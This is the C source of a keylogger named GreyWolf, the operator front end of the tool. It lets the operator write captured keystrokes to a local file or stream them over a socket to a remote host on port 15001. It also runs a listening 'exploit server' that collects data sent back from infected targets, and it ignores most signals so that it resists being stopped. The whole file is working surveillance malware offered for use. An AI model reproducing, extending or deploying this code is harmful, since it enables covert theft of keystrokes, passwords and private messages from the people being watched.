#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include "network_setup.h"
#include "keylogger_core.h"

#define MAXLINE 8192
#define PORT "15001"

void PrintName();
void MainScreenMenu();
int ChooseFile();
int ChooseNetwork();
void CreateExploitSaveFile(int *);
void ChooseExploitServer();

void go_back_handler(int sig)
{
    system("clear");
    execl("./GreyWolf", "./GreyWolf", NULL);
}

void quit_handler(int sig)
{
    system("clear");
    exit(0);
}

void server_quit_handler(int sig);

int main(int argc, char const *argv[])
{
    MainScreenMenu();
    return 0;
}

void PrintName()
{
    system("clear");
    printf("   ___  ____   ____ _  _ __    __   ___   __     ____    \n  // \\\\ || \\\\ ||    \\\\// ||    ||  // \\\\  ||    ||       \n (( ___ ||_// ||==   )/  \\\\ /\\ // ((   )) ||    ||==     \n  \\\\_|| || \\\\ ||___ //    \\V/\\V/   \\\\_//  ||__| ||       \n                                                         \n __ __  ____ _  _ __      ___     ___    ___   ____ ____ \n || // ||    \\\\// ||     // \\\\   // \\\\  // \\\\ ||    || \\\\\n ||<<  ||==   )/  ||    ((   )) (( ___ (( ___ ||==  ||_//\n || \\\\ ||___ //   ||__|  \\\\_//   \\\\_||  \\\\_|| ||___ || \\\\\n");
}

void MainScreenMenu()
{
    for (int i = 1; i < 31; i++)
    {
        if (i != 9 && i != 19)
        {
            if (i == 2)
            {
                signal(i, quit_handler);
            }
            else
            {
                signal(i, SIG_IGN);
            }
        }
    }
    PrintName();
    int choice, outputfd;
    printf("Select output target:-\n1.File\n2.Network\n3.Start Exploit Server\n\nPress Ctrl-C to Quit\nEnter Choice:");
    scanf("%d", &choice);
    switch (choice)
    {
    case 1:
        outputfd = ChooseFile();
        keylogger(outputfd);
        break;

    case 2:
        outputfd = ChooseNetwork();
        keylogger(outputfd);
        break;

    case 3:
        ChooseExploitServer();
        break;

    default:
        printf("\nIncorrect Choice! Try Again!");
        MainScreenMenu();
        break;
    }
    close(outputfd);
}

int ChooseFile()
{
    signal(SIGTSTP, go_back_handler);
    PrintName();
    char fpath[100];
    int output_fd;
    printf("\nPress Ctrl-C to Quit\nPress Ctrl-Z to Go Back\n\nEnter File Path:");
    scanf("%s", fpath);
    printf("Set File Path:%s\n", fpath);
    if ((output_fd = open(fpath, O_WRONLY | O_APPEND | O_CREAT, 0777)) < 0)
    {
        printf("Error accessing file %s: %s\n", fpath, strerror(errno));
        output_fd = ChooseFile();
    }
    return output_fd;
}

int ChooseNetwork()
{
    signal(SIGTSTP, go_back_handler);
    PrintName();
    char npath[100];
    char *host;
    int output_fd;
    printf("\nPress Ctrl-C to Quit\nPress Ctrl-Z to Go Back\n\nEnter Network Path:");
    scanf("%s", npath);
    printf("Set File Path:%s\n", npath);
    host = npath;
    output_fd = host_socketfd(host, PORT);
    return output_fd;
}

void CreateExploitSaveFile(int *outputfd)
{
    char fpath[100];
    printf("\nEnter File Path:");
    scanf("%s", fpath);
    printf("Set File Path:%s\n", fpath);
    if ((*outputfd = open(fpath, O_WRONLY | O_APPEND | O_CREAT, 0777)) < 0)
    {
        printf("Error accessing/creating file %s: %s\n", fpath, strerror(errno));
        CreateExploitSaveFile(outputfd);
    }
}

int outputfd, listenfd, connectionfd;

void ChooseExploitServer()
{
    PrintName();
    struct sockaddr_storage target_address;
    socklen_t target_address_len;
    char target_hostname[MAXLINE], target_port[MAXLINE];
    ssize_t n;
    char buf[MAXLINE];
    listenfd = exploit_serverfd(PORT);
    printf("\nPress Ctrl-C to Quit\n");
    while (1)
    {
        target_address_len = sizeof(struct sockaddr_storage);
        printf("Waiting for incoming target connections...\n");
        connectionfd = accept(listenfd, (struct sockaddr *)&target_address, &target_address_len);
        getnameinfo((struct sockaddr *)&target_address, target_address_len,
                    target_hostname, MAXLINE, target_port, MAXLINE, 0);
        printf("Connected to (%s, %s)\n", target_hostname, target_port);
        CreateExploitSaveFile(&outputfd);
        printf("Start Communication with Target\n");
        if (!fork())
        {
            close(listenfd);
            while ((n = read(connectionfd, buf, MAXLINE)) != 0)
            {
                buf[n] = '\n';
                write(outputfd, buf, n);
            }
            close(connectionfd);
            exit(0);
        }
    }
}

void server_quit_handler(int sig)
{
    close(outputfd);
    close(listenfd);
    close(connectionfd);
    system("clear");
    exit(0);
}